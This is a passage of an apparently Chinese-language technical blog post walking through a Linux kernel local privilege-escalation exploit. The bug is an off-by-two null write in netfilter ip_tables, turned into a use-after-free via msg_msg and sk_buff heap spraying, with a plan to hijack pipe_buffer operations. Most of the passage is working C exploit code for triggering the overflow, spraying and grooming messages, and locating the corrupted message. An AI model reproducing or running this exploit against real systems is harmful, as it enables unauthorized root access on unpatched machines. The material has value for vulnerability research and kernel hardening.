    data<span class="token punctuation">.</span>entry<span class="token punctuation">.</span>next_offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span>
                              <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    data<span class="token punctuation">.</span>entry<span class="token punctuation">.</span>target_offset <span class="token operator">=</span>
        <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>match_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token function">strcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>revision <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>target_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>revision <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> SOL_IP<span class="token punctuation">,</span> IPT_SO_SET_REPLACE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ENOPROTOOPT<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] error ip_tables module is not loaded.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时 memset 如下：</p>
<pre class="line-numbers language-none"><code class="language-none">memset(t-&gt;data + target-&gt;targetsize, 0, 4);
-&gt;
memset(newinfo-&gt;entries + target_offset + 0x20(offset of data &#x3D;&#x3D; sizeof(xt_entry_target)) + 4(target-&gt;targetsize), 0, 4);
-&gt;
memset(newinfo + 0x40 + target_offset + 0x20 + 4, 0, 4);
-&gt;
memset(newinfo + 0x40 + 0x70(sizeof ipt_entry) + 0x20(sizeof xt_entry_match) + match_data + 4(align matchsize) + 0x20 + 4, 0, 4)
-&gt;
memset(newinfo + PAGE_SIZE - 8 - 2 + 4(align matchsize) + 4(target-&gt;targetsize), 0, 4)
-&gt;
memset(newinfo + PAGE_SIZE - 2, 0, 4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/c7dcc58a/pasted-2.png" alt="off-by-2null"></p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><h4 id="构造主消息与副消息"><a href="#构造主消息与副消息" class="headerlink" title="构造主消息与副消息"></a>构造主消息与副消息</h4><p>创建 4096 个消息队列，填充 0x1000 大小的主消息</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PRIMARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_primary<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">int</span> <span class="token function">write_msg</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>msgp <span class="token operator">=</span> msgtyp<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgsnd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying primary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_primary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_primary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_primary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_primary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_PRIMARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再填充大小为 0x400 的副消息：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_secondary<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_SECONDARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Copy 一张图，如下：<br><img src="/images/c7dcc58a/pasted-3.png" alt="messages"><br><strong>注意：</strong>图中的 next 指 <strong>msg_msg-&gt;m_list-&gt;next</strong> 而不是 msg_msg-&gt;next</p>
<p>其中的 <code>*(int *)&amp;mtext[0] = MSG_TAG</code> 用来标记该区域是消息内容区域，<code>*(int *)&amp;mtext[4] = i</code> 用来标记好这个消息是哪个消息队列的消息，当漏洞触发时，next 指向改变，则主消息和副消息的 <code>*(int *)&amp;mtext[4]</code> 值不一样，这样可以找到是哪个 msg_msg 结构体被更改了</p>
<h4 id="制造空洞为-xt-table-info-占位做准备"><a href="#制造空洞为-xt-table-info-占位做准备" class="headerlink" title="制造空洞为 xt_table_info 占位做准备"></a>制造空洞为 xt_table_info 占位做准备</h4><p>间隔 1024，释放部分主消息，使得后面 xt_table_info 分配到这些空洞中</p>
<pre class="line-numbers language-none"><code class="language-none">int read_msg(int id, void *msgp, size_t msgsz, long msgtyp)
&#123;
    if (msgrcv(id, msgp, msgsz - sizeof(long), msgtyp, 0) &lt; 0)
    &#123;
        perror(&quot;[-] msgrcv&quot;);
        return -1;
    &#125;

    return 0;
&#125;
...

    puts(&quot;[*]  Creating holes in primary messages...&quot;);
    for (int i &#x3D; HOLE_STEP; i &lt; NUM_MSQIDS; i +&#x3D; HOLE_STEP)
    &#123;
        if (read_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt; 0)
            goto ret;
    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再 Copy 一张图：<br><img src="/images/c7dcc58a/pasted-4.png" alt="free"></p>
<h4 id="触发漏洞，搜索被破坏的主消息"><a href="#触发漏洞，搜索被破坏的主消息" class="headerlink" title="触发漏洞，搜索被破坏的主消息"></a>触发漏洞，搜索被破坏的主消息</h4><p>触发 2 字节溢出写 0 后，更改了某个 msg_msg 的 m_list.next 指针，也就是副消息会指向其他地方，很可能就是另外某个主消息的副消息，利用 msgrcv 的 MSG_COPY 标志读取副消息，而不释放副消息，对比主副消息的 <code>*(int *)&amp;mtext[4]</code> 是否一致，即可找到目标消息队列：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">peek_msg</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> index<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgrcv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Trigger oob write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trigger_oob_write</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"trigger_oob_write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Searching for corrupted primary message..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> fake_id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> real_id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>i <span class="token operator">%</span> HOLE_STEP<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] MSG_TAG error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            real_id <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            fake_id <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>real_id <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> fake_id <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not corrupt any primary message\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] real_id = %#x, fake_id = %#x\n"</span><span class="token punctuation">,</span> real_id<span class="token punctuation">,</span> fake_id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如图：<br><img src="/images/c7dcc58a/pasted-5.png" alt="corrupt"></p>
<h4 id="释放副消息造成-UAF"><a href="#释放副消息造成-UAF" class="headerlink" title="释放副消息造成 UAF"></a>释放副消息造成 UAF</h4><p>利用 real_id 读取释放副消息，fake_id 的副消息指向已经释放的消息，则造成 UAF</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Free secondary message and then gain UAF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>real_id<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_SECONDARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如图：<br><img src="/images/c7dcc58a/pasted-6.png" alt="trigger UAF"></p>
<hr>
<p>有了 UAF 后，这里大致描述下利用思路</p>
<ol>
<li>skb 堆喷占位，伪造副消息</li>
<li>fake_id peek 副消息来 leak 堆地址</li>
<li>释放 skb ，利用 leak 出的堆地址来 skb 堆喷伪造合法的副消息</li>
<li>fake_id read 释放副消息，因为此时副消息的指针都合法可以脱链</li>
<li>pipe_buffer 堆喷占位</li>
<li>读取并释放 skb，读到 pipe_buffer 的内容，泄露 kernel 地址</li>
<li>skb 堆喷劫持 pipe_buffer-&gt;ops</li>
<li>close pipe，劫持程序执行流提权</li>
</ol>
<hr>
<h3 id="skb-堆喷伪造副消息"><a href="#skb-堆喷伪造副消息" class="headerlink" title="skb 堆喷伪造副消息"></a>skb 堆喷伪造副消息</h3><p>首先得先泄露堆地址，用于后面伪造合法的副消息</p>
<h4 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h4><p>利用 skb 堆喷伪造副消息，伪造 m_ts，利用 fake_id 队列 peek 副消息，即可越界读到相邻的副消息的 msg_msg 结构体，可以泄露 <code>msg_msg-&gt;m_list-&gt;next</code> 和 <code>msg_msg-&gt;m_list-&gt;prev</code> 堆地址</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_type<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> security<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PAGE_SIZE <span class="token operator">-</span> MSG_MSG_SIZE <span class="token operator">+</span> PAGE_SIZE <span class="token operator">-</span> MSG_MSGSEG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_fake<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">void</span> <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> next<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    msg<span class="token operator">-></span>m_list_next <span class="token operator">=</span> m_list_next<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_list_prev <span class="token operator">=</span> m_list_prev<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_FAKE<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> m_ts<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">spray_skbuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> ss<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token keyword">int</span> ss<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> primary_buf<span class="token punctuation">[</span>PRIMARY_SIZE <span class="token operator">-</span> SKB_SHARED_INFO_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
